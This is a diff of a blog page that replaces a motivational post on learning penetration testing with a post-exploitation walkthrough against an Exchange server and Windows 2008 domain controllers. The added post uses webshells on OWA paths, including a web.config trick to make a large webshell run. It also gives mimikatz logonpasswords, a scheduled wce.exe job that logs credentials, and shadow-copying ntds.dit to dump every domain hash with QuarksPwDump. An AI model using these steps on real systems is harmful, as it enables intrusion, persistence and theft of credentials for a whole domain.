@@ -5,7 +5,7 @@
     <head>
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>idea</title>
+<title>windows 2008 domain controllers</title>
 <meta name="description" content="A blog about programming and network security">
 
 <link rel="profile" href="http://gmpg.org/xfn/11" />
@@ -106,13 +106,13 @@
     <div itemscope itemtype="http://schema.org/Article" class="col-md-12 article">
       
 
-      <h1 class="header" itemprop="name">idea</h1>
+      <h1 class="header" itemprop="name">windows 2008 domain controllers</h1>
 
       <div class="author">
         <small><i>
           
-          on <span itemprop="datePublished" content="2014-08-28">April 21, 2016</span>
-           under idea
+          on <span itemprop="datePublished" content="2014-08-28">May 9, 2016</span>
+           under web
         </i></small>
       </div>
 
@@ -126,52 +126,69 @@
 
         
 
-        <span itemprop="articleBody"><p>渗透导图：</p>
-
-<div class="highlighter-rouge"><pre class="highlight"><code>line1&gt; 不断探索目标全面情报------&gt; 找出漏洞
-line2&gt; 不断提升自己核心单点打击力------&gt; 如针对一个应用挖洞，让它成为自己的武器
+        <span itemprop="articleBody"><h3 id="x01-upload-backup-webshells">0x01 upload backup webshells</h3>
+<div class="highlighter-rouge"><pre class="highlight"><code>1.there exists a webshell upload by someone else:https://xx.oo.xx/owa/auth/error1.aspx
+2.webshell in different folder has different privileges
+    https://xx.oo.xx/aspnet_client/system_web/2_0_50727/some.aspx      C:\inetpub\wwwroot\&gt; whoami ---&gt; iis apppool\defaultapppool
+    https://xx.oo.xx对应C:\inetpub\wwwroot\      目录下（index.html）   iis权限
+    https://xx.oo.xx/owa/auth/some.aspx    C:\inetpub\wwwroot\&gt; whoami ---&gt; nt authority\system
+    https://xx.oo.xx/owa/对应C:\Program Files\Microsoft\Exchange Server\V14\ClientAccess\Owa\ 目录 system权限
+3.upload a strong webshell but found "/" error
+    aspx大马连接报错"/"解决方法:http://www.asp-muma.com/?post=97
+    my way defferent from uppon one:
+    create a new folder,create a web.config file with below content:
+    --------------------------content------------------------
+    &lt;configuration&gt;
+        &lt;system.web&gt;
+            &lt;customErrors mode="Off"/&gt;
+        &lt;/system.web&gt;
+    &lt;/configuration&gt;
+    --------------------------end of content----------------
+    then upon a strong webshell to my new created folder,found no more error.
+4.different parse 
+    C:\Program Files\Microsoft\Exchange Server\V14\ClientAccess\Owa\xxoo\xxoo\大马.aspx is ok to parse
+    C:\Program Files\Microsoft\Exchange Server\V14\ClientAccess\Owa\xxoo\xxoo\一句话.aspx is not ok to parse
+    C:\Program Files\Microsoft\Exchange Server\V14\ClientAccess\Owa\一句话.aspx is ok to parse
+    C:\Program Files\Microsoft\Exchange Server\V14\ClientAccess\Owa\auth\一句话.aspx is ok to parse
+    C:\inetpub\wwwroot\大马.aspx is not ok to parse before my "adding a new web.config" way in upon 3
+    C:\inetpub\wwwroot\一句话.aspx is ok to parse,with iis pri
 </code></pre>
 </div>
 
-<p>高阶成事导图：</p>
-
-<div class="highlighter-rouge"><pre class="highlight"><code>                    放弃 (eg.比较好玩的方向,诱惑)
-                     |
-                     |
-                     |
-                  决定方向(挖洞牛中的渗透牛and核心竞争力是在渗透中挖洞)
-                     |
-                     |
-                     |
-                  进步飞快
-                     |
-                     |
-                     |
-    "他到底承受了多少，才能到这个水平"&lt;博人传&gt;
-        "吃得苦中苦，方为人上人"&lt;欢乐颂&gt;
-                     |
-                     |
-                     |
-                  进步飞快
-                     |
-                     |
-                     |
-                   peak
-</code></pre>
-</div>
-
-<p>when feel puzzled,read these to find what you are and where you want to go:</p>
-
-<div class="highlighter-rouge"><pre class="highlight"><code> 1.http://drops.wooyun.org/pentesting/15117
- 2.http://www.zhihu.com/question/31905047
-</code></pre>
-</div>
-
-<p>good habit:</p>
-
-<div class="highlighter-rouge"><pre class="highlight"><code>1.闲时挖洞
-2.6 items in cellphone dock:
-    知乎 feedly ihour 新浪微博 twitter English_words
+<h3 id="x02-find-domain-controllers-and-dc-administrator-username--password">0x02 find domain controllers and dc administrator username &amp; password</h3>
+<div class="highlighter-rouge"><pre class="highlight"><code>http://drops.wooyun.org/tips/421 
+    dsquery server(best)
+    nslookup -type=SRV _ldap._tcp.baidu.com(baidu.com is a domain name,others should be like xxx.org.xx)
+    netdom query fsmo
+mimikatz
+    log
+    privilege::debug
+    sekurlsa::logonpasswords
+at 23:00 /every:M,T,W,Th,F,S,Su c:\recycler\1.bat
+    1.bat:
+    c:\recycler\wce.exe -w &gt;&gt; c:\recycler\1.txt
+    (but this "at" command may not be hidden) ### 0x03 get all hashs in the domain controllers machine
+link a:
+    http://drops.wooyun.org/tips/6617
+link b:
+    https://blogs.msdn.microsoft.com/adioltean/2005/01/05/script-recipe-of-the-week-how-to-copy-an-opened-file/
+*attention*:
+    in link a,the script name to use shadowcopy is vsshadow.exe
+    in link b,the script name to use shadowcopy is vshadow.exe
+I get vshadow.exe from installing https://www.microsoft.com/en-us/download/confirmation.aspx?id=23490,then search vshadow.exe in the system,this is a quick link:
+    http://pan.baidu.com/s/1cMC07W
+there are three files:shadowcopy_ntds.bat,quarkspwdump.exe(v0.2b),vshadow.exe
+step0:
+    upload these three files to target machine's folder,eg. c:\windows\myfolder\
+step1:
+    shadowcopy_ntds.bat c:\windows\ntds\ntds.dit c:\windows\myfolder\ntds.dit
+    (this shadowcopy_ntds.bat is from link b,it can copy any file while the file is being used)
+step2:
+    esentutl /p /o ntds.dit
+step3:
+    QuarksPwDump.exe --dump-hash-domain -with-history -nt c:\windows\ntds\ntds.dit -o c:\windows\myfolder\log.txt
+    (or quarkspwdump.exe --dump-hash-domain -hist -nt c:\windows\ntds\ntds.dit -o c:\windows\myfolder\log.txt)
+    the origin commands from link a is "QuarksPwDump.exe -dhb -hist -nt ntds.dit -o log.txt",which proved wrong with my quarkspwdump.exe file
 </code></pre>
 </div>
 </span>
@@ -183,7 +200,7 @@ line2&gt; 不断提升自己核心单点打击力------&gt; 如针对一个应�
         <div class="tags">
           <small>
           <i class="fa fa-tags"></i>
-            web, idea, thoughts
+            doamin controllers, inside network, aspx, exchange server, outlook
           </small>
         </div>
         
